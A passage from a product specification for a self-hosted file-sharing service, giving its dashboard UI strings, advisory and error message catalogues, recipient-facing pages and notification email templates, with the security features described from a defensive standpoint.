| Restore heading *(dynamic)* | Restore {name}? |
| Restore body | Every version comes back and the artifact resolves at its URL again. Its share links and grants do not come back — trashing revoked them, and anyone who held a link stays locked out until you make a new one. |
| Restore button | Restore |
| Restore rename field | New name |
| Restore toast *(dynamic)* | {name} restored. — Open |
| Delete permanently heading *(dynamic)* | Delete {name} permanently? |
| Delete permanently body *(dynamic)* | Every version of this artifact goes, and every file nothing else references is removed from disk. {bytes} freed. This cannot be undone. |
| Type-to-confirm label *(dynamic)* | Type {name} to confirm |
| Delete permanently button | Delete permanently |
| Empty trash heading | Empty the trash? |
| Empty trash body *(dynamic)* | {count} artifacts and every version they hold are deleted for good, freeing {bytes}. This cannot be undone. |
| Empty trash confirm label | Type empty trash to confirm |
| Empty trash button | Empty trash |

### 12.5.16 — Search and command palette (11.16)

| Element | String |
| --- | --- |
| Input placeholder | Search names, titles, descriptions, and tags |
| Group headings | Artifacts · Actions · Recent |
| Actions | Upload a file · Create an API token · Open trash · Review storage · Things you have not opened |
| Key hints | ↑↓ navigate · ⏎ open · ⌘⏎ new tab · esc close · → all results |
| All results link | See all results |
| No matches *(dynamic)* | No artifacts match "{query}". |
| Standing explanation | Search covers names, titles, descriptions, and tags — never the contents of your files. — Why |
| First-use footer | Search covers only your own artifacts and anything shared with you. There is no instance-wide search. |
| Rate limited *(dynamic)* | Too many searches. Results resume in {seconds} seconds. |
| Full page title *(dynamic)* | Results for "{query}" |

### 12.5.17 — Upload (11.17)

| Element | String |
| --- | --- |
| Page title | Upload |
| Drop zone | Drop a file or a folder here, or choose one |
| Drop zone helper | A folder keeps its structure, so a page with its styles and images works as posted. |
| Choose file button | Choose files |
| Choose folder button | Choose a folder |
| Name field | Name |
| Name helper *(dynamic)* | This is the address: share.c52.com/{name}. Lowercase letters, digits, `.`, `_`, `-`, and `/`. |
| Name normalized note *(dynamic)* | Posting as {normalized} |
| Title / description / tags labels | Title (optional) · Description (optional) · Tags (optional) |
| Metadata helper | These are the only things search can see. Nothing is filled in from your files. |
| Entry file label | Which file answers at the root |
| TTL label | Expires after (optional) |
| Standing note | Posting does not share anything. This artifact will be private until you create a share link. |
| Primary button | Post artifact |
| Hashing *(dynamic)* | Reading {count} files… Large files take a moment. |
| Uploading *(dynamic)* | Uploading {done} of {total} |
| Skipped *(dynamic)* | {skipped} of {total} files are already on the server. |
| Committing | Finishing… |
| Refused — path | This path cannot be posted: {path}. Rename it and try again. |
| Refused — dotfile | Files and folders starting with a dot cannot be posted: {path}. |
| Refused — secret *(dynamic)* | {path} looks like a credential file. Share will not accept it from a browser. |
| Error — `name_taken` *(dynamic)* | {name} already exists. Overwriting keeps the current version and makes this v{next}. |
| Error — `name_taken` actions | Overwrite as a new version · Use a different name |
| Error — `quota_exceeded` *(dynamic)* | This would use {projected} of your {quota} quota. You are at {current} now. — Manage storage |
| Interrupted | The upload stopped. Nothing is live yet and the files already sent are still on the server. — Resume |
| Success toast *(dynamic)* | Posted {name} v{seq} — private. — Copy URL |

### 12.5.18 — API tokens (11.18)

| Element | String |
| --- | --- |
| Page title | API tokens |
| New token button | New token |
| Column headers | Name · Prefix · Scopes · Last used |
| Never used | never |
| Revoked section *(dynamic)* | Revoked ({count}) |
| Row summary *(dynamic)* | created {date} · {count} artifacts posted |
| Row menu | Edit scopes · Rename · View activity · View artifacts · Revoke |
| Empty heading | No tokens yet |
| Empty body | An agent needs a token to post here. Create one below, or run `share login` and approve it from this browser. |
| New token heading | New API token |
| Name field | Name |
| Name placeholder | agent@machine |
| Name helper | This name appears on every artifact it posts and in every audit record. |
| Expiry field | Expires (optional) |
| Scopes heading | What this token can do |
| Scope — `artifacts:read` | Read and download your artifacts |
| Scope — `artifacts:write` | Post, overwrite, rename, tag, and move to the trash |
| Scope — `artifacts:delete` | Delete permanently, skipping the trash |
| Scope — `share:create` | Create, extend, and revoke share links, and grant to other users |
| Scope — `account:read` | Read your profile, quota, and token list |
| Scope — `account:admin` | Create tokens, invite users, and change settings |
| Create button | Create token |
| Created heading | Token created |
| Created body | Shown once, right now. Store it in whatever your agent reads secrets from. |
| Created MCP block heading | Ready to paste into your MCP host |
| Created exit | Done |
| Revoke heading *(dynamic)* | Revoke {name}? |
| Revoke body | The agent using it stops working on its next request. Everything it posted stays, still attributed to it. This cannot be undone — a new token is a new secret. |
| Revoke button | Revoke token |
| Scope change confirm *(dynamic)* | Give {name} the ability to create share links? |

### 12.5.19 — Passkeys and sessions (11.19)

| Element | String |
| --- | --- |
| Page title | Security |
| Passkeys heading | Passkeys |
| Add button | Add a passkey |
| Passkey row *(dynamic)* | {name} — added {date} · last used {relative} |
| Backup state | syncs across your devices · this device only |
| Passkey actions | Rename · Revoke |
| One-passkey advisory | You have one passkey. If you lose it, the only ways back in are your recovery code or access to the server. — Add another |
| Last passkey refusal | This is your only passkey and it cannot be revoked. Register another one first. |
| Revoke passkey heading *(dynamic)* | Revoke {name}? |
| Revoke passkey body *(dynamic)* | It stops working immediately and the {count} sessions created with it are signed out. This cannot be undone; the authenticator can be registered again as a new passkey. |
| Revoke passkey, own session | You are signed in with this passkey, so you will be signed out. |
| Sessions heading | Sessions |
| Session row *(dynamic)* | {userAgent} · {ip} · started {date} · last seen {relative} · via {passkeyName} |
| This device marker | This device |
| Sign out everywhere | Sign out everywhere |
| Sign out everywhere confirm | Every session is signed out, including this one. Your passkeys and tokens are unaffected. |
| Recovery card heading | Recovery code |
| Recovery card, exists *(dynamic)* | One outstanding code, generated {date}. |
| Recovery card, none | No recovery code. Generate one now — it is the only way back if every passkey is gone and you cannot reach the server. |
| Generate button | Generate a new code |
| Generate confirm | The current code stops working immediately and the new one is shown once. |
| Recovery-session notice | This session came from a recovery code and can only register a passkey. |

### 12.5.20 — Security overview (11.20)

| Element | String |
| --- | --- |
| Page title | Security overview |
| Card 1 heading | Reachable without signing in |
| Card 1 empty | Nothing of yours is reachable without a sign-in. |
| Card 1 row *(dynamic)* | {name} — expires {expiry} ({relative}) |
| Card 2 heading | Recent sign-ins |
| Card 3 heading | Anomalies |
| Card 3 empty | Nothing unusual in the last 7 days. |
| Card 4 heading | Tokens |
| Card 4 body *(dynamic)* | {live} live · {sharing} can create share links |
| Anomaly — link rate *(dynamic)* | {token} created {count} share links in an hour. |
| Anomaly — first link *(dynamic)* | {token} created its first share link. |
| Anomaly — bulk post *(dynamic)* | {token} posted {bytes} in an hour. |
| Anomaly — bulk create *(dynamic)* | {token} created {count} artifacts in an hour. |
| Anomaly — bulk trash *(dynamic)* | {token} moved {count} artifacts to the trash in an hour. |
| Anomaly — new IP *(dynamic)* | {token} was used from an address it has not been seen at before. |
| Anomaly — recovery code | A recovery code was used to sign in. |
| Anomaly — counter regression *(dynamic)* | Passkey {name} reported an unexpected use count, which can mean it has been copied. |
| Anomaly action | Revoke this token |
| Panic button | Revoke all share links |
| Panic heading | Revoke every share link on your account? |
| Panic body *(dynamic)* | {count} live links stop working immediately and everyone currently viewing one is signed out. This cannot be undone. Your artifacts and grants are untouched. |
| Panic confirm label | Type revoke all to confirm |
| Instance toggle | My account · This instance |

### 12.5.21 — Settings (11.21)

| Element | String |
| --- | --- |
| Page title | Settings |
| Profile heading | Profile |
| Display name | Display name |
| Email | Email — changed by the operator |
| Handle | Handle — permanent |
| Sharing heading | Sharing |
| Default TTL | Default share-link duration |
| Default TTL helper | The preset marked "your default" when you create a link. |
| Notify on share | Email me when a share link is created |
| Notify on share helper | Including links created by an agent holding `share:create`. |
| Notify on expiring | Email me 24 hours before a link expires |
| Standing sharing note | Every share link expires. There is no setting for that. — Why |
| Versions heading | Versions |
| Retention fields | Keep the last · Keep for · Keep pinned versions · Never go below |
| Retention helper | Pruning runs overnight, not when you save this. |
| Retention preview *(dynamic)* | This would prune {count} versions across {artifacts} artifacts on the next nightly run. |
| Staleness heading | Staleness |
| Stale days | Count an artifact stale after |
| Stale helper | Nothing is ever deleted for being stale. It only appears in a list. |
| Notifications heading | Notifications |
| Notification rows | Storage warnings · A token was created · Unusual activity |
| Always-on row | A recovery code was used · A passkey reported an unexpected use count |
| Always-on reason | Always on. These two mean someone may be getting into your account. |
| Display heading | Display |
| Time zone | Show times in |
| Time zone options | UTC · This browser's time zone |
| Saved indicator | Saved |
| Save failed | That did not save. The old value is back. |

### 12.5.22 — Users and invites (11.22)

| Element | String |
| --- | --- |
| Page title | Users |
| Users column headers | Handle · Name · Email · Artifacts · Storage · Last seen |
| Invite button | Invite someone |
| Invites heading | Pending invites |
| Invites column headers | Email · Handle · Invited by · Expires |
| Only-you body | You are the only account. Share has no sign-up — people get accounts because you invite them. |
| Invite heading | Invite someone |
| Invite fields | Email address · Handle |
| Invite preview *(dynamic)* | Their space will be share.c52.com/~{handle}. |
| Invite helper | The handle is claimed now and cannot be changed later. Invites are good for 7 days. |
| Invite button | Send invite |
| Invite error — reserved | That handle is reserved. |
| Invite error — taken | That handle is already claimed. |
| Invite rate limited *(dynamic)* | 10 invites a day is the ceiling. Try again in {hours} hours. |
| Invite actions | Resend · Revoke |
| Invite expired note | Expired. Revoke it and send a new one. |
| Disable heading *(dynamic)* | Disable {handle}? |
| Disable body | Their sessions and every token they hold are revoked immediately. Their artifacts stay. Live share links on their artifacts keep working until they expire. |
| Disable checkbox | Revoke their share links too |
| Disable button | Disable user |
| Disabled row note | Disabled. Sessions and tokens revoked; artifacts retained. |
| No-delete note | There is no delete-a-user action here. Removing a user and their artifacts for good is `sharectl delete-user`, on the server. |

### 12.5.23 — Audit log (11.23)

| Element | String |
| --- | --- |
| Page title | Audit log |
| Filters | Action · Actor · Token · Date range · Search |
| Shortcut | Sharing only |
| Column headers | Time · Action · Actor · Target · Address |
| Expander | Details |
| System actor | system |
| Export button | Export as NDJSON |
| Export note | Exports the current filter, streamed. |
| Deleted target note | This target has been deleted. The name shown is what it was called at the time. |
| Empty for filters | No events match these filters. |
| Instance toggle | My events · This instance |
| Instance strip | Showing every user's events on this instance. |
| Pagination | Newer · Older |

### 12.5.24 — Staleness (11.24)

| Element | String |
| --- | --- |
| Page title | Not opened recently |
| Header *(dynamic)* | {count} artifacts you have not opened in {days} days · {bytes} |
| Window link | Change the window |
| Column addition | Last opened |
| Never viewed | never opened |
| Footnote | Pinned artifacts, and anything with a live share link or grant, are never listed here. |
| Nothing stale *(dynamic)* | Everything you own has been opened in the last {days} days. |
| Bulk bar *(dynamic)* | {count} selected · {bytes} |
| Bulk button | Move selected to trash |
| Bulk confirm *(dynamic)* | Move {count} artifacts ({bytes}) to the trash? They stay restorable for 30 days. Their share links and grants are revoked now and are not restored on restore. |
| Bulk progress *(dynamic)* | {done} of {count} moved |
| Bulk partial failure *(dynamic)* | {done} moved. {failed} could not be: {names}. |
| Keep action | Keep |
| Keep toast *(dynamic)* | {name} pinned. Pinned artifacts never appear here. |

### 12.5.25 — Storage and quota (11.25)

| Element | String |
| --- | --- |
| Page title | Storage |
| Meter *(dynamic)* | {used} of {quota} · {percent} |
| Artifact count *(dynamic)* | {count} artifacts |
| 80% note | Above 80%. Storage warnings are emailed at most once a day. |
| 95% note | Above 95%. Posting fails at 100%. |
| 100% note | Out of storage. Posting is refused. Reading, sharing, and deleting still work, so you can always dig out. |
| Largest heading | Largest artifacts |
| Free-space heading | What would free space |
| Free-space rows *(dynamic)* | Trash — {bytes} · Not opened in {days} days — {bytes} · Old versions — about {bytes} |
| Free-space actions | Open trash · Review · Retention settings |
| Dedup footnote | Identical files are stored once for the whole instance, and each user is charged for every file their artifacts reference. Your figure is what your artifacts reference, which is why it will not match a simple sum of what is on disk. |
| Operator note | If this figure looks wrong, `sharectl recompute-quota` recounts it from the manifests. |
| Root disk row *(dynamic)* | Instance disk: {free} free of {total} · last backup {date} |

### 12.5.26 — Device authorization (11.26)

| Element | String |
| --- | --- |
| Page title | Authorize an agent |
| Intro | Enter the code your agent printed. |
| Field label | Code |
| Field placeholder | XXXX-XXXX |
| Lookup button | Continue |
| Approval heading *(dynamic)* | Give {agentName} a token? |
| Approval rows | Requested from · Started · Scopes |
| Approval scopes | Read and download your artifacts · Post, overwrite, rename, tag, and move to the trash |
| Approval hard line | This token will not be able to create share links. |
| Approval buttons | Approve · Deny |
| Unknown code | That code is not valid. It may have expired — codes last 10 minutes. Run the command again for a new one. |
| Already approved | That code has already been used. |
| Approved heading | Approved |
| Approved body *(dynamic)* | {agentName} has a token. Return to your terminal — the token is not shown here. |
| Approved action | Manage this token |
| Denied heading | Denied |
| Denied body | No token was issued. The agent will report that the request was refused. |
| Rate limited *(dynamic)* | Too many authorization attempts. Try again in {minutes} minutes. |

### 12.5.27 — Help and agent setup (11.27)

| Element | String |
| --- | --- |
| Page title | Help |
| Nav sections | Quickstart · Posting artifacts · Privacy and sharing · Share links and grants · Versions, trash, and getting things back · Search · Connecting agents · CLI reference · Passkeys and recovery · Users and invites · Storage and quotas |
| Agent page title | Connecting agents |
| No-token callout | You have no tokens yet. An agent needs one to post here. — Create a token |
| Copy control | Copy |
| Copy confirmation | Copied |
| Token placeholder note | Replace `shr_YOUR_TOKEN` with a real token. Share never fills a real token into these blocks. |
| Linked topics heading | Three things people ask |
| Linked topics | Why search cannot read your files · Why every share link expires · What happens when an agent overwrites something you shared |

### 12.5.28 — Instance status (11.28)

| Element | String |
| --- | --- |
| Page title | Instance status |
| Tiles | Version · Uptime · Disk · Last backup · Queues |
| Subsystem headers | Check · State · Detail |
| Subsystems | Database · Redis · File storage · Worker · Migrations |
| All green | Everything is responding. |
| Degraded *(dynamic)* | {check} is not healthy. |
| Disk warning *(dynamic)* | Disk is {percent} full. |
| Backup stale *(dynamic)* | Last successful backup: {date}. |
| Worker behind | The worker is behind. View counts and precompression lag; nothing is lost. |
| Read-only note | This screen is read-only. Restarts, flushes, and destructive operations are `sharectl` commands on the server. |
| Non-root view | Version, uptime, and your own storage. Everything else is visible to the operator. |

### 12.5.29 Global patterns

**App shell**

| Element | String |
| --- | --- |
| Sidebar groups | Library · Agents |
| Sidebar items | Artifacts · Shared with me · Trash · API tokens · Audit log |
| Storage meter *(dynamic)* | {used} of {quota} |
| User menu | Settings · Security · Security overview · Users · Instance status · Help · Sign out |
| Anomaly dot tooltip | Something unusual happened in the last 7 days. |

**Sharing-state indicator**

| State | Label | Detail |
| --- | --- | --- |
| Private | Private | Only you — or, where space allows: Only you and anyone you grant |
| Granted *(dynamic)* | Shared with {count} people | {handles} |
| Link *(dynamic)* | Link active | expires {expiry} — with ({relative}) where the container is wide enough |
| Icon-only accessible name *(dynamic)* | Link active, expires {expiryLongForm}, password required | — |

**Toasts and clipboard**

| Event | String |
| --- | --- |
| Generic copy | Copied |
| Artifact URL copied | URL copied. This is the signed-in address — it will not work for anyone else. |
| Path copied | Path copied |
| SHA-256 copied | SHA-256 copied |
| Undo affordance | Undo |
| Undo expired | That can no longer be undone here. — Open trash |
| Optimistic revert *(dynamic)* | That change did not save and has been put back. {message} |
| Error toast suffix *(dynamic)* | {message} · {code} — Copy request ID |

**Errors and connection**

| Element | String |
| --- | --- |
| Region error retry | Retry |
| Route 404 heading | Not found |
| Route 404 body | This artifact does not exist, or it is not yours. |
| Route 403 heading | Not available |
| Route 403 body | This part of Share is not available to your account. |
| Connection lost | Cannot reach share.c52.com. Retrying. — Retry now |
| Connection restored | Reconnected. |
| Maintenance in app | share.c52.com is not responding. It may be restarting. — Instance status |

**Confirmation dialogs**

| Element | String |
| --- | --- |
| Cancel | Cancel |
| Type-to-confirm mismatch | That does not match. |
| Irreversible marker | This cannot be undone. |

**Keyboard reference sheet (`?`)**

| Element | String |
| --- | --- |
| Heading | Keyboard shortcuts |
| Rows | Command palette · Focus search · Go to artifacts · Go to shared · Go to trash · Go to tokens · Upload · Close · Move selection · Open · Open in a new tab · This sheet |
| Footnote | Nothing destructive has a shortcut. Deleting always takes a menu and a confirmation. |

---

## 12.6 Warning and advisory catalogue

Advisories are never blocking. Over the API they arrive in `warnings[]` as
`{ "code": "...", "message": "..." }` with the exact message below. In the CLI they print to
stderr as `warning: <message>`. In the dashboard they appear where the "Shown" column says, in
the informational treatment unless marked amber.

| Code | Message | Shown | What to do |
| --- | --- | --- | --- |
| `no_entry_point` | No file answers at this artifact's root, so visitors see a file listing. Set an entry file to change that. | Post response; artifact detail beside the kind line; Files tab banner | Pick an entry file on the Files tab, or post again with `entryPath`. Takes effect without reposting. |
| `shadowing_name` | An artifact named {other} already exists, and this name is a prefix of it. Paths under /{name}/ now resolve inside this artifact first. | Post response; upload screen; artifact detail | Rename one of the two if the addresses matter. Nothing breaks if they do not overlap. |
| `ttl_with_live_links` | This artifact has {count} live share links. When it expires, it moves to the trash and those links stop working. | Set TTL dialog before confirming (amber); `PATCH` response | Shorten the TTL, extend nothing, or revoke the links deliberately rather than letting them die with the artifact. |
| `secret_file_found` | {path} looks like a credential file. It was not posted. | CLI, before upload (amber); browser upload, as a refusal | Remove it from the directory, or exclude it. The CLI needs `--force-secrets` to send it; the browser will not send it at all. |
| `low_quota` | You are using {percent} of your {quota} storage. Posting fails at 100%. | Post response above 80%; dashboard banner (amber); storage screen | Empty the trash, review artifacts you have not opened, or tighten version retention. |
| `link_expiring` | This share link expires {expiry} ({relative}). | Sharing panel and artifact detail inside 48 hours (amber); dashboard banner | Extend it, or let it end. Extension adds to the current expiry. |
| `artifact_expiring` | This artifact expires {expiry} ({relative}) and moves to the trash. | Artifact detail strip (amber); dashboard banner | Choose **Keep this artifact** to clear the TTL, or change it. |
| `phishing_shape` | This artifact contains a password field in a form that submits to another site. Share does not block it, and you are the only person being told. | Post response; artifact detail (amber); create-link summary | If it is a mockup, ignore it. If it is not, do not share it — a link like this can get the whole domain flagged. |
| `framing_disabled` | This artifact asked to allow framing. That is ignored for password-protected links, because a framed password gate is a way to steal the password. | Create-link summary; post response | Nothing, unless the artifact needs to be embedded, in which case share it without a password. |
| `large_video` | This video is {bytes}. Share does not transcode anything, so it plays only where the browser supports its format. H.264 audio and video in an MP4 container plays everywhere. | Post response for video over 500 MB; upload screen | Nothing required. Re-encode before posting if recipients may be on older browsers. |
| `untitled_artifact` | This artifact has no title, so it shows its name everywhere. Search can only see names, titles, descriptions, and tags. | Post response; artifact detail | Add a title and tags. Share will never generate one from the contents. |
| `generated_name` | No name was supplied, so this artifact is at {name}. Generated names are fine for scratch output and hard to find later. | Post response; CLI output; artifact detail for the first 7 days | Rename it if you will come back to it. Renaming does not break share links. |
| `no_second_passkey` | You have one passkey. If you lose it, the only ways back in are your recovery code or access to the server. | Security screen (amber); first-run checklist; after registering the first passkey | Register a second passkey on another device. |
| `unrecoverable_link_url` | The full URL was only shown when this link was created. Share stores a hash of it and cannot show it again. | Sharing panel, on any link not created in this browser session | Create a new link if you need to send it again, then revoke the old one. |

Two scope warnings are not advisories in `warnings[]` — they are inline confirmations on 11.18,
and they read:

> **`share:create`** — This token will be able to make your artifacts reachable by anyone with a
> URL, without asking you. You will be emailed each time it does. Leave this off unless the agent
> genuinely needs it.

> **`artifacts:delete`** — This token will be able to delete artifacts permanently, skipping the
> trash. Without it, the worst it can do is fill the trash, which you can undo.

---

## 12.7 Recipient-facing pages (R1–R7)

These pages are seen by clients and counterparties. They are plain, they do not brand, and they
give away nothing about whether an artifact exists or who owns it. Every one carries the
hostname `share.c52.com` as plain text at the top and nothing else that could identify the
sender.

### R1 — Share-link password gate (401)

| Element | String |
| --- | --- |
| Wordmark line | share.c52.com |
| Heading | This link needs a password. |
| Field label | Password |
| Button | Continue |
| Wrong password | That password is not correct. |
| Rate limited heading | Too many attempts. |
| Rate limited body *(dynamic)* | Try again in {minutes} minutes. |
| `<title>` | share.c52.com |

Nothing else appears on this page: no artifact name, no title, no file type, no size, no sender,
no expiry, no attempt counter, and no link anywhere else in the product.

### R2 — Landing for a non-HTML artifact (200)

| Element | String |
| --- | --- |
| Wordmark line | share.c52.com |
| Title line *(dynamic)* | {title} — omitted entirely when the owner set no title |
| Metadata line *(dynamic)* | {kind} · {fileCount} files · {bytes} |
| Metadata line, single file *(dynamic)* | {kind} · {bytes} |
| Primary button | View |
| Secondary button | Download |
| Unrenderable body *(dynamic)* | This is a {contentType} file. |
| `<title>` *(dynamic)* | {title} — otherwise share.c52.com |

No copy-URL control, no sharing controls, no sign-in prompt, and no invitation to make an
account.

### R3 — Link expired or revoked (410)

| Element | String |
| --- | --- |
| Wordmark line | share.c52.com |
| Heading | This link is no longer active. |
| Body | Ask whoever sent it for a new one. |
| `<title>` | share.c52.com |

One state only. Expired, revoked, burned through its view limit, and deleted are deliberately
indistinguishable. No artifact name, no owner, no date, no reason, and no controls.

### R4 — Not found (404)

| Element | String |
| --- | --- |
| Wordmark line | share.c52.com |
| Heading | Not found. |
| Body | Nothing is available at this address. |
| `<title>` | share.c52.com |

Byte-identical for every cause: a name that never existed, an artifact that is not yours, an
expired TTL, something in the trash, and a missing file inside an artifact you can see all
produce exactly this. No sign-in link — offering one would tell a scanner that signing in might
help.

### R5 — Rate limited (429)

| Element | String |
| --- | --- |
| Wordmark line | share.c52.com |
| Heading | Too many requests. |
| Body *(dynamic)* | Try again in {minutes} minutes. |
| Body, under a minute | Try again in a moment. |
| `<title>` | share.c52.com |

The bucket name never appears here. It is in `detail.bucket` on API responses, where an agent
can act on it.

### R6 — Maintenance (503)

| Element | String |
| --- | --- |
| Wordmark line | share.c52.com |
| Heading | share.c52.com is not available right now. |
| Body | It is probably restarting. Try again shortly. |
| `<title>` | share.c52.com |

No timestamp, no estimate, and no auto-refresh: this is a static file that cannot know when the
service came back, and an unattended tab reloading a downed instance is exactly the traffic an
operator does not need mid-incident.

### R7 — Artifact file listing (200)

| Element | String |
| --- | --- |
| Wordmark line | share.c52.com |
| Heading *(dynamic)* | {title} — otherwise {name}; through a share link, {title} or nothing |
| Metadata line *(dynamic)* | {fileCount} files · {bytes} |
| Column order | path, content type, size — as plain text, no header row |

Every path is a relative link, so it resolves under whichever address is in the bar, including
`/s/{token}/`. Sorted by path with directories grouped. No sorting controls, no search, no
download-all, and no owner handle — through a share link the heading never reveals a name the
recipient was not given.

---

## 12.8 Error message catalogue

Every `code` defined in Parts 4–10, with the sentence that ships in `error.message`. These
sentences are one sentence each, safe to print to a terminal, free of paths and credentials, and
they are what the dashboard shows when it has nothing more specific (§11.29.10). The CLI column
is filled only where the terminal phrasing differs; otherwise the CLI prints
`error: <code>: <message>` with the same sentence.

### 12.8.1 Authentication and identity (Part 4)

| Code | HTTP | User-facing sentence | CLI |
| --- | --- | --- | --- |
| `invalid_token` | 401 | That API token is not valid. | No valid token. Run `share login`, or set SHARE_TOKEN. |
| `invalid_credential` | 401 | That passkey is not registered here. | — |
| `credential_counter_regressed` | 401 | This passkey reported an unexpected use count, which can mean it has been copied; sign-in was refused and the account owner has been emailed. | — |
| `webauthn_verification_failed` | 401 | That sign-in could not be verified. | — |
| `session_expired` | 401 | Your session has ended. Sign in again. | — |
| `recipient_auth_required` | 401 | This link needs a password. | — |
| `recipient_auth_failed` | 401 | That password is not correct. | — |
| `insufficient_scope` | 403 | This token does not have the {scope} scope. | This token cannot do that: it needs {scope}. Add it on the API tokens screen. |
| `csrf_failed` | 403 | That request could not be verified. Reload the page and try again. | — |
| `wrong_credential_class` | 403 | That credential cannot be used here — share links open artifacts, not the API. | — |
| `invite_expired` | 410 | This invite has expired. Ask whoever invited you for a new one. | — |
| `authorization_pending` | 428 | Waiting for someone to approve this request in the dashboard. | Waiting for approval… |

### 12.8.2 Artifacts, uploads, and naming (Part 5)

| Code | HTTP | User-facing sentence | CLI |
| --- | --- | --- | --- |
| `file_hash_mismatch` | 400 | The uploaded bytes do not match the digest they were declared with. | Upload of {path} did not match its checksum. Retrying is safe. |
| `file_size_mismatch` | 400 | The uploaded file is a different size than declared. | Upload of {path} was a different size than declared. Retrying is safe. |
| `upload_signature_invalid` | 403 | That upload link has expired or been altered. | Upload link expired. Re-run the post; files already sent are kept. |
| `not_your_artifact` | 403 | That artifact belongs to another user's space. | — |
| `artifact_not_found` | 404 | No artifact named {name} in your space. | — |
| `version_not_found` | 404 | That version does not exist. | — |
| `file_not_found` | 404 | That file is not in this version. | — |
| `name_taken` | 409 | The name {name} is already in use, possibly by something in your trash. | The name {name} is taken. Restore it, rename it, or empty the trash. |
| `files_missing` | 409 | Some declared files have not been uploaded yet. | {count} files still uploading. |
| `upload_session_closed` | 409 | That upload has already been committed or abandoned. | — |
| `upload_session_expired` | 409 | That upload session has expired. Start it again — the files already sent are still on the server. | Upload session expired. Re-running is cheap: nothing needs re-uploading. |
| `idempotency_key_reused` | 409 | That idempotency key was already used with a different request. | — |
| `quota_exceeded` | 413 | This post would use {projected} of your {quota} storage limit. | Out of storage: {projected} needed, {quota} allowed. Empty your trash or delete something. |
| `artifact_too_large` | 413 | This version is {size}, over the {limit} limit for one artifact version. | — |
| `file_too_large` | 413 | {path} is {size}, over the {limit} limit for one file. | — |
| `too_many_files` | 413 | This version has {count} files, over the limit of {limit}. | — |
| `invalid_name` | 422 | {name} is not a valid artifact name — use lowercase letters, digits, dots, underscores, hyphens, and slashes, starting with a letter or digit. | — |
| `name_reserved` | 422 | {name} is reserved by Share and cannot be used as an artifact name. | — |
| `invalid_path` | 422 | The file path {path} cannot be used. | — |
| `dotfile_rejected` | 422 | Files and folders starting with a dot cannot be posted: {path}. | {path} starts with a dot and was refused. Exclude it. |
| `path_case_collision` | 422 | Two files differ only by capitalization: {a} and {b}. Rename one. | — |
| `invalid_archive` | 422 | That archive contains a symlink, a device file, or a path that escapes the archive. | — |
| `archive_ratio_exceeded` | 422 | That archive expands too far to be accepted. | — |
| `use_share_endpoint` | 422 | Sharing is not changed here — use the share-link endpoints. | Use `share link` to change sharing. |
| `too_many_uploads` | 429 | Too many uploads running on this session at once. | Slowing down: too many parallel uploads. Try `--concurrency 4`. |

### 12.8.3 Serving (Part 6)

| Code | HTTP | User-facing sentence | CLI |
| --- | --- | --- | --- |
| `not_found` | 404 | Nothing is available at this address. | — |
| `link_expired` | 410 | This link is no longer active. | This link is no longer active. |

`not_found` is returned identically for an unknown name, an artifact that is not yours, an
expired TTL, a trashed artifact, and a missing file inside a visible artifact. No variant of this
message exists.

### 12.8.4 Sharing (Part 7)

| Code | HTTP | User-facing sentence | CLI |
| --- | --- | --- | --- |
| `insufficient_scope` | 403 | This token cannot create share links — it needs the share:create scope. | This token cannot create share links. Create it in the dashboard, or add share:create to the token. |
| `not_your_artifact` | 403 | That artifact belongs to another user's space. | — |
| `link_not_found` | 404 | No such share link, or it has already been revoked. | — |
| `grant_not_found` | 404 | No such grant. | — |
| `user_not_found` | 404 | No user with the handle {handle} on this instance. | — |
| `grant_exists` | 409 | That artifact is already shared with {handle}. | — |
| `cannot_grant_to_self` | 409 | That is your own account. | — |
| `ttl_too_long` | 422 | Share links on this instance last at most {maxTtl}. | — |
| `password_too_short` | 422 | A link password needs at least 8 characters. | — |
| `artifact_trashed` | 422 | That artifact is in the trash and cannot be shared until it is restored. | — |

### 12.8.5 Versions, trash, and search (Part 8)

| Code | HTTP | User-facing sentence | CLI |
| --- | --- | --- | --- |
| `version_is_live` | 409 | The live version cannot be deleted. | — |
| `version_deleted` | 409 | That version has been deleted and cannot be previewed or restored. | — |
| `artifact_not_trashed` | 409 | That artifact is not in the trash. | — |
| `name_taken` | 409 | Another artifact now uses the name {name}. Restore it under a different name. | The name {name} is in use. Restore with `--name <new>`. |
| `invalid_ttl` | 422 | {value} is not a valid duration or is in the past. | — |
| `invalid_filter` | 422 | {parameter} is not a filter Share supports. | — |
| `restore_files_missing` | 422 | A file this version needs has been removed from disk, so it cannot be restored. | — |

### 12.8.6 Limits and instance state (Part 10)

| Code | HTTP | User-facing sentence | CLI |
| --- | --- | --- | --- |
| `rate_limited` | 429 | Too many requests. Try again in {minutes} minutes. | Rate limited on {bucket}. Retrying in {seconds}s. |
| `disk_full` | 507 | This instance is out of disk space, so posting is refused. Reading and sharing still work. | Server is out of disk. Posting refused; the operator has been notified. |

### 12.8.7 Rules that apply to every message

- No message names a filesystem path on the server, a database identifier, a token, a password,
  or an internal hostname. `{path}` is always the path the caller supplied.
- No message says "please", "sorry", or "unexpected".
- A 404 never explains why. `artifact_not_found` is returned over the API to a caller who is
  authenticated into their own space; every unauthenticated or cross-space miss is `not_found`.
- The dashboard never invents friendlier text for an unknown code: it prints `error.message`.
- Every error response carries `requestId`, and every error surface offers to copy it.

---

## 12.9 Email templates

Plain text, sent from the instance's configured address. Every email is addressed to one person
and none of them contain tracking, images, or an unsubscribe link that is not a real settings
link. Times are absolute UTC with the relative form in parentheses, matching the dashboard.

Every share-link email states the artifact, the absolute expiry, and carries a one-click revoke
URL. That is the point of them: the owner should be able to end an unwanted disclosure from
their phone, in bed, without signing in to look for it first.

---

**`link_created`** — a share link was created

> **Subject:** Share link created for {name}
>
> A share link was created for {name} ({title}).
>
> Created by: {actorName}
> Expires:    {expiry} ({relative})
> Password:   {set / not set}
> Label:      {label / none}
> Link:       {url}
>
> Anyone holding that URL can view this artifact until it expires, without signing in.
>
> Revoke it now: {revokeUrl}
> Manage sharing: {shareUrl}
>
> You are getting this because share-link notifications are on. Turn them off: {settingsUrl}

---

**`link_expiring`** — 24 hours before a link expires

> **Subject:** Share link for {name} expires tomorrow
>
> The share link "{label}" for {name} expires {expiry} ({relative}).
>
> After that, anyone opening it sees only that the link is no longer active.
>
> Extend by 14 days: {extendUrl}
> Choose another duration: {shareUrl}
> Revoke it now: {revokeUrl}

---

**`link_ended`** — a link expired or was revoked

> **Subject:** Share link for {name} has ended
>
> The share link "{label}" for {name} is no longer active as of {endedAt}.
>
> Reason: {expired / revoked by {actorName} / view limit reached}
> Views while it was live: {count}
>
> {name} is now {private / still reachable through {count} other live links}.
>
> Create a new link: {shareUrl}

---

